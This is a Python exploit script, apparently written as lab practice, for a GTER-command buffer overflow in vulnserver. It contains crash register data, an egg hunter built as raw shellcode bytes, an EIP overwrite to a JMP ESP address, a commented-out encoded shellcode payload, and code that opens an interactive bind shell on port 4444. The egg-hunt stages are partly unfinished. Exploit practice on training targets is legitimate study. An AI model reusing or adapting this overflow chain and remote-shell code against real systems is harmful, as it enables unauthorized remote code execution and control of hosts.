#!/usr/bin/python

"""
Buffer overflow in GTER command can lead to RCE.
Crash data is as below. ~148 bytes available for shell
code, so we'll have to use the egg hunter method
as in KSTET. However, not as easy since every command
in memory is not long enough to execute code. Thus, we need
to egg hunt 3 times, pushing the data (which is of fixed length)
to ESP, then at the end JMP ESP


Crash data:


EAX 0170F940 ASCII 47,"TER Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1A"
ECX 004513F4
EDX 00000000
EBX 0000005C
ESP 0170F9E0
EBP 41396541
ESI 00000000
EDI 00000000
EIP 66413066 @ 151 in pattern
C 0  ES 0023 32bit 0(FFFFFFFF)
P 1  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 1  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFDD000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
               3 2 1 0      E S P U O Z D I
FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1



"""


import socket
import struct
import sys
from time import sleep


# Prep needle to load into VAS
needle = "DjH1"
needle_hex = "0x"
for i in needle:
    needle_hex += hex(ord(i)).split("x")[1]

# Exploit to send
# exploit = "\xCC\xCC\xCC"
# exploit = "\xbb\x38\xa8\x95\x3e\xda\xd2\xd9\x74\x24\xf4\x5f\x31\xc9" + \
# "\xb1\x56\x31\x5f\x13\x83\xc7\x04\x03\x5f\x37\x4a\x60\xc2" + \
# "\xaf\x03\x8b\x3b\x2f\x74\x05\xde\x1e\xa6\x71\xaa\x32\x76" + \
# "\xf1\xfe\xbe\xfd\x57\xeb\x35\x73\x70\x1c\xfe\x3e\xa6\x13" + \
# "\xff\x8e\x66\xff\xc3\x91\x1a\x02\x17\x72\x22\xcd\x6a\x73" + \
# "\x63\x30\x84\x21\x3c\x3e\x36\xd6\x49\x02\x8a\xd7\x9d\x08" + \
# "\xb2\xaf\x98\xcf\x46\x1a\xa2\x1f\xf6\x11\xec\x87\x7d\x7d" + \
# "\xcd\xb6\x52\x9d\x31\xf0\xdf\x56\xc1\x03\x09\xa7\x2a\x32" + \
# "\x75\x64\x15\xfa\x78\x74\x51\x3d\x62\x03\xa9\x3d\x1f\x14" + \
# "\x6a\x3f\xfb\x91\x6f\xe7\x88\x02\x54\x19\x5d\xd4\x1f\x15" + \
# "\x2a\x92\x78\x3a\xad\x77\xf3\x46\x26\x76\xd4\xce\x7c\x5d" + \
# "\xf0\x8b\x27\xfc\xa1\x71\x86\x01\xb1\xde\x77\xa4\xb9\xcd" + \
# "\x6c\xde\xe3\x99\x41\xed\x1b\x5a\xcd\x66\x6f\x68\x52\xdd" + \
# "\xe7\xc0\x1b\xfb\xf0\x27\x36\xbb\x6f\xd6\xb8\xbc\xa6\x1d" + \
# "\xec\xec\xd0\xb4\x8c\x66\x21\x38\x59\x28\x71\x96\x31\x89" + \
# "\x21\x56\xe1\x61\x28\x59\xde\x92\x53\xb3\x69\x95\x9d\xe7" + \
# "\x3a\x72\xdc\x17\xad\xde\x69\xf1\xa7\xce\x3f\xa9\x5f\x2d" + \
# "\x64\x62\xf8\x4e\x4e\xde\x51\xd9\xc6\x08\x65\xe6\xd6\x1e" + \
# "\xc6\x4b\x7e\xc9\x9c\x87\xbb\xe8\xa3\x8d\xeb\x63\x9c\x46" + \
# "\x61\x1a\x6f\xf6\x76\x37\x07\x9b\xe5\xdc\xd7\xd2\x15\x4b" + \
# "\x80\xb3\xe8\x82\x44\x2e\x52\x3d\x7a\xb3\x02\x06\x3e\x68" + \
# "\xf7\x89\xbf\xfd\x43\xae\xaf\x3b\x4b\xea\x9b\x93\x1a\xa4" + \
# "\x75\x52\xf5\x06\x2f\x0c\xaa\xc0\xa7\xc9\x80\xd2\xb1\xd5" + \
# "\xcc\xa4\x5d\x67\xb9\xf0\x62\x48\x2d\xf5\x1b\xb4\xcd\xfa" + \
# "\xf6\x7c\xfd\xb0\x5a\xd4\x96\x1c\x0f\x64\xfb\x9e\xfa\xab" + \
# "\x02\x1d\x0e\x54\xf1\x3d\x7b\x51\xbd\xf9\x90\x2b\xae\x6f" + \
# "\x96\x98\xcf\xa5"

# Exploit code is 361

"""
STATS, RTIME, LTIME, SRUN holds 96 bytes
Total 384 bytes - 32 identifier bytes = 352 bytes. Just short!

"""


exploit = "A"*500

gdog_cmd = "RTIME " + needle*2 + exploit + "A"*500 + "\n"


# Give a little padding to the beginning of the egg hunter code
intro_nop = "\x90"*100

# Search for needle in VAS space. Shell code given by Matt
# http://www.nologin.com/Downloads/Papers/egghunt-shellcode.pdf

# Find the first egg
egg_hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
egg_hunter += struct.pack(">I", int(needle_hex, 16))
# egg_hunter += "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# Comment out the line from KSTET. Reasoning: We don't want to return
# to EDI, we want to make room on the stack then push the value of 
# EDI to the stack

egg_hunter += "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7"
# make room on the stack
# sub ESP, 0x514
# 00000000  81EC14050000      sub esp,0x514
sub_esp = "\x81\xec\x14\x05"
# Move edi into esp
# asm > mov [esp], edi
# 00000000  893C24            mov [esp],edi
edi_to_esp = "\x89\x3c\x24"
egg_hunter += sub_esp + edi_to_esp



# Find the second egg


# find the third egg

# egg_hunter += "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# Make EIP jump back to where our memory shellcode is located
# by aligning registers
# nasm > mov eax,esp
# 00000000  89E0              mov eax,esp
# nasm > sub eax,byte 0x40
# 00000000  83E840            sub eax,byte +0x40
# nasm > jmp eax
# 00000000  FFE0              jmp eax
jmp_eax = "\x89\xe0\x83\xe8\x40\xff\xe0"
struct.pack("<s", jmp_eax)

# JMP ESP from essfunc.dll
eip = struct.pack("<I", 0x625011af)

# NOP sled. Overwrite EIP @ 70 chars in
outro_nop = "\x90"*(151-len(egg_hunter) - len(intro_nop))

# Put it all together! Bring it home!
buf = "GTER " + intro_nop + egg_hunter + outro_nop + eip + jmp_eax + "\n"


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = (sys.argv[1], int(sys.argv[2]))

print "[+] Connecting to vulnserver at %s:%d" % conn
sock.connect(conn)
header = sock.recv(1024)
print "[+] Sending RTIME primer needle."
sock.send(gdog_cmd)
data = sock.recv(1024)
print data
print "[+] Sending EIP overwrite/crash"
sock.send(buf)
print "[+] Exploit sent. Connecting to bind shell on port 4444."
shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Give the socket time to open up, like a flower in bloom.
sleep(5)
shell.connect((sys.argv[1], 4444))
data = shell.recv(4096)
print data
shell.send("\n")
while True:
    data = shell.recv(4096)
    cmd = raw_input(data) + "\n"
    shell.send(cmd)